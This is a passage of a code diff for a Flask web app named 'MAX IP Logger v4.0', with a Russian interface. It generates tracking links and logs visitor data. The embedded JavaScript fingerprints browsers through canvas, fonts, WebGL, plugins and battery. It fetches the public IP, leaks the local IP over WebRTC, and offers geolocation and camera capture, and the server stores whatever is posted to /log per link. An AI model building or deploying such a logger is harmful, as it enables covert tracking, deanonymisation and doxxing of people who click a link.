+                });
+        }
+
+        // ===== БАТАРЕЯ =====
+        info.battery = { 'Заряд': '⏳ ...', 'Зарядка': '⏳ ...' };
+        if (navigator.getBattery) {
+            const timeout = setTimeout(() => {
+                info.battery['Заряд'] = '⏱️ таймаут';
+                info.battery['Зарядка'] = '⏱️ таймаут';
+                renderAll();
+            }, 3200);
+            navigator.getBattery()
+                .then(bat => {
+                    clearTimeout(timeout);
+                    info.battery['Заряд'] = `${Math.round(bat.level * 100)}%`;
+                    info.battery['Зарядка'] = bat.charging ? '🔌 да' : '🔋 нет';
+                    renderAll();
+                })
+                .catch(() => {
+                    clearTimeout(timeout);
+                    info.battery['Заряд'] = '❌ ошибка';
+                    info.battery['Зарядка'] = '❌ ошибка';
+                    renderAll();
+                });
+        }
+
+        // ===== ШРИФТЫ =====
+        info.fonts = { 'Обнаружено': '⏳ ...', 'Список': '⏳ ...' };
+        try {
+            const c = document.createElement('canvas');
+            const ctx = c.getContext('2d');
+            const testText = 'abcdefghijklmnopqrstuvwxyz';
+            const baseFont = 'monospace';
+            const fontList = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Georgia','Trebuchet MS','Tahoma','Impact','Comic Sans MS'];
+            let detected = [];
+            for (const f of fontList) {
+                ctx.font = `14px "${f}", ${baseFont}`;
+                const w1 = ctx.measureText(testText).width;
+                ctx.font = `14px ${baseFont}`;
+                const w2 = ctx.measureText(testText).width;
+                if (w1 !== w2) detected.push(f);
+            }
+            info.fonts['Обнаружено'] = detected.length + ' шт.';
+            info.fonts['Список'] = detected.length ? detected.join(', ') : 'нет';
+        } catch (e) {}
+
+        // ===== ПУБЛИЧНЫЙ IP =====
+        info.publicIP = { 'IPv4': '⏳ ...', 'Источник': '⏳ ...' };
+        (async function fetchIP() {
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json', { cache: 'no-cache', signal: AbortSignal.timeout(2000) });
+                const data = await resp.json();
+                info.publicIP['IPv4'] = data.ip || '❌';
+                info.publicIP['Источник'] = 'ipify.org';
+            } catch (e) {
+                info.publicIP['IPv4'] = '❌ недоступен';
+                info.publicIP['Источник'] = '—';
+            }
+            renderAll();
+        })();
+
+        // ===== ЛОКАЛЬНЫЙ IP =====
+        info.webrtc = { 'Локальный IP': '⏳ ...' };
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('test');
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            const ips = new Set();
+            pc.onicecandidate = (e) => {
+                if (e.candidate && e.candidate.candidate) {
+                    const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+                    if (match && !match[1].startsWith('127.')) ips.add(match[1]);
+                }
+            };
+            setTimeout(() => {
+                info.webrtc['Локальный IP'] = ips.size ? Array.from(ips).join(', ') : '⏱️ таймаут';
+                renderAll();
+                pc.close();
+            }, 3200);
+        } catch (e) {
+            info.webrtc['Локальный IP'] = '❌ не поддерживается';
+            renderAll();
+        }
+
+        // ===== WebGL =====
+        info.webgl = { 'Рендерер': '⏳ ...', 'Версия': '⏳ ...' };
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (gl) {
+                info.webgl['Рендерер'] = gl.getParameter(gl.RENDERER) || '—';
+                info.webgl['Версия'] = gl.getParameter(gl.VERSION) || '—';
+            } else {
+                info.webgl['Рендерер'] = '🚫 не поддерживается';
+                info.webgl['Версия'] = '—';
+            }
+        } catch (e) {
+            info.webgl['Рендерер'] = '❌ ошибка';
+            info.webgl['Версия'] = '❌ ошибка';
+        }
+
+        // ===== ХРАНИЛИЩА =====
+        info.storage = {
+            'LocalStorage': (typeof localStorage !== 'undefined') ? '✅ доступен' : '❌ нет',
+            'SessionStorage': (typeof sessionStorage !== 'undefined') ? '✅ доступен' : '❌ нет',
+            'IndexedDB': 'indexedDB' in window ? '✅ доступен' : '❌ нет',
+        };
+
+        // ===== CANVAS ОТПЕЧАТОК =====
+        info.canvas = { 'Отпечаток': '⏳ ...' };
+        try {
+            const c = document.createElement('canvas');
+            c.width = 256; c.height = 128;
+            const ctx = c.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(0, 0, 16, 16);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Canvas Fingerprint', 2, 15);
+            const fp = c.toDataURL();
+            info.canvas['Отпечаток'] = fp.substring(0, 60) + '...';
+        } catch (e) {
+            info.canvas['Отпечаток'] = '❌ ошибка';
+        }
+
+        // ===== ДОПОЛНИТЕЛЬНО =====
+        info.extra = {
+            'Время загрузки': '⏳ ...',
+            'Элементов': document.querySelectorAll('*').length + ' шт.',
+        };
+        if (performance && performance.timing) {
+            const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
+            info.extra['Время загрузки'] = loadTime > 0 ? `${loadTime} мс` : '—';
+        }
+
+        // ===== УСТРОЙСТВО =====
+        const ua = navigator.userAgent;
+        info.device = {
+            'Мобильное': /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? '✅ да' : '❌ нет',
+            'Тип': /iPad/i.test(ua) ? 'Планшет' : /Mobi|Android|iPhone|iPod/i.test(ua) ? 'Телефон' : 'Десктоп',
+            'ОС': ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/)?.[0] || '—',
+        };
+
+        // ===== ПЛАГИНЫ =====
+        info.plugins = {
+            'Количество': navigator.plugins ? navigator.plugins.length : '—',
+            'Список': navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : '—',
+        };
+
+        // ===== ADBLOCK =====
+        info.adblock = { 'AdBlock': '⏳ ...' };
+        try {
+            const testAd = document.createElement('div');
+            testAd.className = 'adsbox';
+            testAd.style.display = 'block';
+            testAd.style.height = '1px';
+            document.body.appendChild(testAd);
+            info.adblock['AdBlock'] = testAd.offsetHeight === 0 ? '✅ да' : '❌ нет';
+            document.body.removeChild(testAd);
+        } catch (e) { info.adblock['AdBlock'] = '❌ ошибка'; }
+
+        statusBadge.className = 'badge badge-success';
+        statusBadge.textContent = '✅ готово';
+        apiStatus.textContent = '✅ данные собраны';
+        timestamp.textContent = new Date().toLocaleTimeString('ru-RU');
+        renderAll();
     }
 
-    sendAllData();
+    // ========== ОТРИСОВКА ==========
+    function renderAll() {
+        const sections = [
+            { title: '🌐 Браузер', data: info.browser },
+            { title: '🖥️ Экран', data: info.screen },
+            { title: '⏰ Время', data: info.time },
+            { title: '⚙️ Железо', data: info.hardware },
+            { title: '📍 ГЕО', data: info.geo },
+            { title: '🎤 Медиа', data: info.media },
+            { title: '🔋 Батарея', data: info.battery },
+            { title: '🔤 Шрифты', data: info.fonts },
+            { title: '🌍 Публичный IP', data: info.publicIP },
+            { title: '🔗 Локальный IP', data: info.webrtc },
+            { title: '🎮 WebGL', data: info.webgl },
+            { title: '💾 Хранилища', data: info.storage },
+            { title: '🎨 Canvas', data: info.canvas },
+            { title: '📊 Доп.', data: info.extra },
+            { title: '📱 Устройство', data: info.device },
+            { title: '🔌 Плагины', data: info.plugins },
+            { title: '🛡️ AdBlock', data: info.adblock },
+        ];
+        if (info.photo) sections.push({ title: '📸 ФОТО', data: info.photo });
+
+        let html = '';
+        for (const sec of sections) {
+            const isGeo = sec.title.includes('ГЕО');
+            const isPhoto = sec.title.includes('ФОТО');
+            const border = isGeo ? 'border:2px solid #4a9eff;' : (isPhoto ? 'border:2px solid #4aff8a;' : '');
+            html += `<div class="card" style="${border}">
+                <div class="card-title">${sec.title}</div>
+                <div class="card-content">`;
+            for (const [key, val] of Object.entries(sec.data)) {
+                const v = (val === undefined || val === null) ? '—' : String(val);
+                if (isGeo && key === '📍 Координаты' && !v.includes('не определены') && !v.includes('недоступны')) {
+                    html += `<div><span class="label">${key}</span> <span class="geo-coords">${v}</span></div>`;
+                } else {
+                    html += `<div><span class="label">${key}</span> ${v}</div>`;
+                }
+            }
+            html += `</div></div>`;
+        }
+        grid.innerHTML = html;
+    }
+
+    // ========== КНОПКИ ==========
+    document.getElementById('requestGeoBtn').addEventListener('click', requestGeolocation);
+    document.getElementById('refreshBtn').addEventListener('click', () => location.reload());
+    document.getElementById('exportBtn').addEventListener('click', exportJSON);
+    document.getElementById('copyBtn').addEventListener('click', copyAllData);
+    startCameraBtn.addEventListener('click', startCamera);
+    takePhotoBtn.addEventListener('click', takePhoto);
+    stopCameraBtn.addEventListener('click', stopCamera);
+    clearPhotoBtn.addEventListener('click', clearPhoto);
+
+    document.getElementById('resetBtn').addEventListener('click', function() {
+        geoCoords = null;
+        geoError = null;
+        if (info.photo) delete info.photo;
+        clearPhoto();
+        stopCamera();
+        Object.keys(info).forEach(key => { if (key !== 'geo') delete info[key]; });
+        statusBadge.className = 'badge badge-pending';
+        statusBadge.textContent = '⏳ загрузка';
+        collectAllData();
+        showToast('🔄 Сброшено');
+    });
+
+    // ========== ЗАПУСК ==========
+    collectAllData();
+    console.log('🚀 MAX IP Logger v4.0 загружен');
 })();
 </script>
 </body>
@@ -329,7 +789,6 @@ LOGGER_HTML = """
 """
 
 # ===================== МАРШРУТЫ =====================
-
 @app.route('/')
 def index():
     return render_template_string(INDEX_HTML)
@@ -339,7 +798,6 @@ def generate_link():
     link_id = str(uuid.uuid4())[:8]
     links_db[link_id] = {'created': datetime.datetime.now().isoformat()}
     logs_db[link_id] = []
-    
     return jsonify({
         'id': link_id,
         'full_url': f"{request.host_url}l/{link_id}",
@@ -352,52 +810,20 @@ def generate_link():
 def serve_logger(link_id):
     if link_id not in links_db:
         return 'Ссылка не найдена', 404
-    return render_template_string(LOGGER_HTML, link_id=link_id)
+    return render_template_string(INDEX_HTML)
 
 @app.route('/log', methods=['POST'])
 def log_data():
     data = request.get_json()
     link_id = data.get('link_id')
-    
     if link_id not in logs_db:
         logs_db[link_id] = []
-    
-    # Убираем лишнее
-    clean_data = {
-        'ip': data.get('ip', 'Unknown'),
-        'webrtc_ip': data.get('webrtc_ip', 'Unknown'),
-        'country': data.get('country', 'Unknown'),
-        'city': data.get('city', 'Unknown'),
-        'region': data.get('region', 'Unknown'),
-        'isp': data.get('isp', 'Unknown'),
-        'device': data.get('device', 'Unknown'),
-        'os': data.get('os', 'Unknown'),
-        'browser': data.get('browser', 'Unknown'),
-        'user_agent': data.get('user_agent', 'Unknown'),
-        'screen': data.get('screen', 'Unknown'),
-        'timezone': data.get('timezone', 'Unknown'),
-        'language': data.get('language', 'Unknown'),
-        'cookies': data.get('cookies', 'No cookies'),
-        'fingerprint': data.get('fingerprint', 'Unknown'),
-        'plugins': data.get('plugins', 'Unknown'),
-        'do_not_track': data.get('do_not_track', 'Unknown'),
-        'referer': data.get('referer', 'Direct'),
-        'time': data.get('timestamp', datetime.datetime.now().isoformat())
-    }
-    
-    logs_db[link_id].append(clean_data)
+    logs_db[link_id].append(data)
     return jsonify({'status': 'ok'})
 
 @app.route('/stats/<link_id>')
 def get_stats(link_id):
-    if link_id not in logs_db:
-        return jsonify({'visitors': [], 'total': 0})
-    
-    visitors = logs_db.get(link_id, [])
-    return jsonify({
-        'visitors': visitors,
-        'total': len(visitors)
-    })
+    return jsonify({'visitors': logs_db.get(link_id, []), 'total': len(logs_db.get(link_id, []))})
 
 @app.route('/clear/<link_id>', methods=['POST'])
 def clear_stats(link_id):
@@ -407,8 +833,6 @@ def clear_stats(link_id):
 
 @app.route('/export/<link_id>')
 def export_stats(link_id):
-    if link_id not in logs_db:
-        return 'Not found', 404
     return jsonify(logs_db.get(link_id, []))
 
 if __name__ == '__main__':
